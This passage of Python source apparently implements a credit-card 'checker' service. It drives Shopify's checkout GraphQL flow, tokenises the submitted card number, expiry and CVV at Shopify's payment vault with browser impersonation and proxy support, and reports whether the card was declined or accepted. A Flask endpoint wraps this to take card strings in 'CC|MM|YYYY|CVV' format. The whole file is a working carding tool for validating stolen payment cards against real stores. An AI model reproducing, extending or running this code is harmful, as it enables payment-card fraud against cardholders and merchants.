                if tax_data and tax_data.get("__typename") == "FilledTaxTerms":
                    tax_amount_data = tax_data.get("totalTaxAmount", {}).get("value", {}).get("amount", "0")
                    tax_amount = float(tax_amount_data)
                else:
                    tax_amount = 0.0
            except:
                tax_amount = 0.0

            payment_identifier = None
            gateway = "UNKNOWN"
            total_price = "0.0"

            payment_data = seller_proposal.get("payment", {})
            if payment_data and payment_data.get("__typename") == "FilledPaymentTerms":
                payment_methods = payment_data.get("availablePaymentLines", [])
                for method in payment_methods:
                    payment_method = method.get("paymentMethod", {})
                    if payment_method.get("name") or payment_method.get("paymentMethodIdentifier"):
                        payment_identifier = payment_method.get("paymentMethodIdentifier")
                        gateway = payment_method.get("extensibilityDisplayName") or payment_method.get("name", "UNKNOWN")
                        total_price = str(float(running_total) + shipping_amount + tax_amount)
                        break
            
            if not payment_identifier:
                return False, "No valid payment method found", gateway, total_price, currency

            # Step 4: GraphQL Proposal Request (Delivery and Payment)
            json_data["query"] = QUERY_PROPOSAL_DELIVERY
            json_data["variables"]["delivery"]["deliveryLines"][0]["selectedDeliveryStrategy"] = {
                "deliveryStrategyByHandle": {
                    "handle": delivery_strategy if delivery_strategy else "",
                    "customDeliveryRate": False
                },
                "options": {}
            }
            json_data["variables"]["delivery"]["deliveryLines"][0]["targetMerchandiseLines"] = {
                "lines": [{"stableId": "1"}]
            }
            json_data["variables"]["delivery"]["deliveryLines"][0]["expectedTotalPrice"] = {
                "value": {"amount": str(shipping_amount), "currencyCode": currency}
            }
            json_data["variables"]["delivery"]["deliveryLines"][0]["destinationChanged"] = False
            json_data["variables"]["payment"]["billingAddress"] = {
                "streetAddress": {
                    "address1": street, "address2": address2, "city": city,
                    "countryCode": country_code, "postalCode": s_zip,
                    "firstName": firstName, "lastName": lastName,
                    "zoneCode": state, "phone": phone
                }
            }
            json_data["variables"]["taxes"]["proposedTotalAmount"]["value"]["amount"] = str(tax_amount)
            json_data["variables"]["buyerIdentity"]["shopPayOptInPhone"]["number"] = phone

            response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                session, graphql_url, params, headers, json_data, checkout_url, max_retries=3, proxy=proxy
            )
            
            if captcha_solved:
                return False, "CAPTCHA_REQUIRED on delivery proposal", gateway, total_price, currency

            # Step 5: Get payment token
            payload = {
                "credit_card": {
                    "number": cc,
                    "month": int(mes),
                    "year": int(ano),
                    "verification_value": cvv,
                    "start_month": None,
                    "start_year": None,
                    "issue_number": "",
                    "name": f"{firstName} {lastName}"
                },
                "payment_session_scope": urlparse(site_url).netloc
            }
            
            vault_headers = {
                "Content-Type": "application/json",
                "Accept": "application/json",
                "Accept-Language": "en-US,en;q=0.9",
                "Origin": "https://checkout.pci.shopifyinc.com",
                "Referer": "https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
                "sec-ch-ua": "\"Chromium\";v=\"146\", \"Not-A.Brand\";v=\"24\", \"Microsoft Edge\";v=\"146\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "sec-fetch-storage-access": "active",
            }
            if ident_sig:
                vault_headers["shopify-identification-signature"] = ident_sig
            
            # Using curl_cffi for this post request as well
            response = curl_requests.post(
                "https://checkout.pci.shopifyinc.com/sessions", 
                json=payload, 
                headers=vault_headers, 
                impersonate="chrome110",
                timeout=30
            )
            
            try:
                token_data = response.json()
                token = token_data.get("id")
                if not token:
                    return False, "Unable to get payment token", gateway, total_price, currency
            except Exception as e:
                return False, f"Unable to get payment token: {str(e)}", gateway, total_price, currency

            # Step 6: Submit for completion
            params = {"operationName": "SubmitForCompletion"}
            
            submit_variables = {
                "input": {
                    "sessionInput": {"sessionToken": sst},
                    "queueToken": queueToken or "",
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {
                                "streetAddress": {
                                    "address1": street, "address2": address2, "city": city,
                                    "countryCode": country_code, "postalCode": s_zip,
                                    "firstName": firstName, "lastName": lastName,
                                    "zoneCode": state, "phone": phone
                                }
                            },
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyByHandle": {
                                    "handle": delivery_strategy if delivery_strategy else "",
                                    "customDeliveryRate": False
                                },
                                "options": {"phone": phone}
                            },
                            "targetMerchandiseLines": {
                                "lines": [{"stableId": "1"}]
                            },
                            "deliveryMethodTypes": ["SHIPPING"],
                            "expectedTotalPrice": {
                                "value": {"amount": str(shipping_amount), "currencyCode": currency}
                            },
                            "destinationChanged": False
                        }],
                        "noDeliveryRequired": [],
                        "useProgressiveRates": True,
                        "prefetchShippingRatesStrategy": None,
                        "supportsSplitShipping": True
                    },
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": "1",
                            "merchandise": {
                                "productVariantReference": {
                                    "id": f"gid://shopify/ProductVariantMerchandise/{merch}",
                                    "variantId": f"gid://shopify/ProductVariant/{merch}",
                                    "properties": [],
                                    "sellingPlanId": None,
                                    "sellingPlanDigest": None
                                }
                            },
                            "quantity": {"items": {"value": 1}},
                            "expectedTotalPrice": {
                                "value": {"amount": running_total, "currencyCode": currency}
                            },
                            "lineComponentsSource": None,
                            "lineComponents": []
                        }]
                    },
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [{
                            "paymentMethod": {
                                "directPaymentMethod": {
                                    "paymentMethodIdentifier": payment_identifier,
                                    "sessionId": token,
                                    "billingAddress": {
                                        "streetAddress": {
                                            "address1": street, "address2": address2,
                                            "city": city, "countryCode": country_code,
                                            "postalCode": s_zip, "firstName": firstName,
                                            "lastName": lastName, "zoneCode": state,
                                            "phone": phone
                                        }
                                    },
                                    "cardSource": None
                                }
                            },
                            "amount": {
                                "value": {"amount": total_price, "currencyCode": currency}
                            },
                            "dueAt": None
                        }],
                        "billingAddress": {
                            "streetAddress": {
                                "address1": street, "address2": address2,
                                "city": city, "countryCode": country_code,
                                "postalCode": s_zip, "firstName": firstName,
                                "lastName": lastName, "zoneCode": state,
                                "phone": phone
                            }
                        }
                    },
                    "taxes": {
                        "proposedTotalAmount": {
                            "value": {"amount": str(tax_amount), "currencyCode": currency}
                        }
                    },
                    "localizationExtension": {
                        "languageCode": "en",
                        "countryCode": country_code
                    },
                    "nonNegotiableTerms": {
                        "signature": "",
                        "contents": []
                    },
                    "scriptFingerprint": {"value": ""},
                    "transformerFingerprintV2": "",
                    "optionalDuties": {"accept": True},
                    "attribution": {"attributions": []},
                    "captcha": None, # CAPTCHA will be handled by make_graphql_request_with_captcha_handling
                    "saleAttributions": {"attributions": []}
                },
                "operationName": "SubmitForCompletion"
            }

            response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                session, graphql_url, params, headers, submit_variables, checkout_url, max_retries=3, proxy=proxy
            )
            
            if captcha_solved:
                return False, "CAPTCHA_REQUIRED on submit", gateway, total_price, currency

            if not response:
                return False, f"Submit request failed: {resp_text}", gateway, total_price, currency

            try:
                submit_resp_json = json.loads(resp_text)
            except json.JSONDecodeError as e:
                return False, f"Invalid JSON in submit response: {str(e)}", gateway, total_price, currency

            if "errors" in submit_resp_json:
                errors = submit_resp_json.get("errors", [])
                error_msgs = [e.get("message", str(e)) for e in errors[:3]]
                return False, f"Submit GraphQL Error: {'; '.join(error_msgs)}", gateway, total_price, currency

            # Check for card declined or other payment errors
            if "card declined" in resp_text.lower() or "declined" in resp_text.lower():
                return False, "Card declined", gateway, total_price, currency

            # Success condition (needs to be more robust based on actual API response)
            if submit_resp_json.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {}).get("__typename") == "NegotiationResultAvailable":
                return True, "Success", gateway, total_price, currency
            else:
                return False, f"Unknown submit response: {resp_text}", gateway, total_price, currency

    except Exception as e:
        return False, f"An unexpected error occurred: {str(e)}", "UNKNOWN", "0.0", "USD"


app = Flask(__name__)

@app.route("/shopify", methods=["GET"])
def shopify_checker():
    try:
        site = request.args.get("site")
        cc_string = request.args.get("cc")
        proxy_str = request.args.get("proxy")
        
        if not site:
            return jsonify({
                "error": "Missing 'site' parameter",
                "status": False
            }), 400
        
        if not cc_string:
            return jsonify({
                "error": "Missing 'cc' parameter in format CC|MM|YYYY|CVV",
                "status": False
            }), 400
        
        try:
            cc_parts = parse_cc_string(cc_string)
            cc = cc_parts["cc"]
            mes = cc_parts["mes"]
            ano = cc_parts["ano"]
            cvv = cc_parts["cvv"]
        except ValueError as e:
            return jsonify({
                "error": str(e),
                "status": False
            }), 400
        
        variant_id = request.args.get("variant")
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        try:
            success, message, gateway, price, currency = loop.run_until_complete(
                process_card_async(cc, mes, ano, cvv, site, variant_id, proxy_str)
            )
        finally:
            loop.close()
        
        clean_response = extract_clean_response(message)
        
        response_data = {
            "Gateway": gateway,
            "Price": float(price) if price.replace(".", "", 1).isdigit() else 0.0,
            "Response": clean_response,
            "Status": success,
            "cc": cc_string
        }
        
        return jsonify(response_data)
        
    except Exception as e:
        return jsonify({
            "error": str(e),
            "status": False,
            "Gateway": "UNKNOWN",
            "Price": 0.0,
            "Response": f"ERROR: {str(e)}",
            "cc": request.args.get("cc", "")
        }), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
